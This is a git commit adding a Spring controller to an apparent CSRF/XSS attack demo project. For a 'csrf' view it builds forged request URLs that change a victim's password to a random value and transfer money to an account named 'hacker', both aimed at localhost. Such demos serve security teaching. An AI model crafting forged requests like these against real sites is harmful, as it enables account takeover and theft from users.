d12fcd3a8bcee95bf30eb5ac142996cb55f25d68
fengfw <451488920@qq.com>
2018-02-05 15:47:48 +0800

    change something

---
+++ src/main/java/com/csrf/attackDemo/MyController.java
@@ -0,0 +1,36 @@
+package com.csrf.attackDemo;
+
+import org.apache.commons.lang3.RandomStringUtils;
+import org.springframework.stereotype.Controller;
+import org.springframework.ui.Model;
+import org.springframework.web.bind.annotation.RequestMapping;
+
+
+@Controller
+public class MyController {
+
+    @RequestMapping(value = "/xss")
+    public String indexXSS() {
+        return "xss";
+    }
+
+    @RequestMapping(value = "/csrf")
+    public String indexCSRF(Model model) {
+        //获取6位随机字符串
+        String password= RandomStringUtils.randomAlphanumeric(6);
+        model.addAttribute("password",password);
+        String modifyPasswordUrl="http://localhost:8080/verify?newPassword1="+password
+                +"&newPassword2="+password;
+        String transferUrl="http://localhost:8080/transfer?username=hacker&money=50";
+        model.addAttribute("modifyPasswordUrl",modifyPasswordUrl);
+        model.addAttribute("transferUrl",transferUrl);
+        return "csrf";
+    }
+
+//    @RequestMapping(value = "/test")
+//    public void testCSRF(@ModelAttribute(value="url") Url url) {
+//        String webUrl=url.getWebUrl();
+//        System.out.println("webUrl-1:"+webUrl);
+//
+//    }
+}
